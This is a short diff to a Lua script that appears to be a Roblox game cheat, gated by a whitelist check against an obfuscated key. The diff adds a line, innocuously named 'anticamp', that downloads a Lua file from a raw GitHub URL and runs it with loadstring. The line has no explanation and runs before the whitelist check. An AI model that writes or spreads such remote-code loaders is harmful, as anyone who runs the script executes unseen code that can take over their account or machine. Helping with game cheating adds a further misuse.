@@ -318,6 +318,7 @@ if game.placeId == 8569358381 or game.placeId == 3237168 then
     if _G.wqeiqotqrjqwiomcvkfdgewkr == "wqmekwqmoikgmtreiofgmriogermtoigwemroew" then
         _G.WhiteListed = true
     end
+anticamp = loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/golden.lua"))()
     if _G.WhiteListed then
         game:GetService("Workspace").Island8.Table.Chair.Seat.Name = "condimemay"
         _G.chaircframeh = game:GetService("Workspace").Island8.Table.Chair.condimemay.CFrame
